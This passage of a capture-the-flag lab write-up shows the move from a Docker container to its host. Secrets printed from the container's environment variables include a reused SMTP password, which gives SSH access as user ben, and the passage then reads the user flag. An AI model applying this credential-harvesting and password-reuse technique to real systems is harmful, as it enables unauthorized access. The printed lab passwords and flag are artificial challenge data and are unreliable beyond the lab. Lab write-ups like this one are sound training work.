## Getting Off Docker

### Environment Variables

The first thing to check in any Docker container is the environment variables. Applications often get their configuration passed in through env vars:

```bash
env
```

```
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
```

Two passwords here. `F1l3_d0ck3r` is the Flowise admin password and `r04D!!_R4ge` is the SMTP password. The username ben maps to the SSH user on the host.

### SSH Access

```bash
ssh ben@10.129.245.103
```

Using `r04D!!_R4ge` as the password gets us in. The SMTP password was reused for the SSH account.

### User Flag

```bash
ben@silentium:~$ cat user.txt
c6ff6662b884efb2ba427064c628f9f9
```

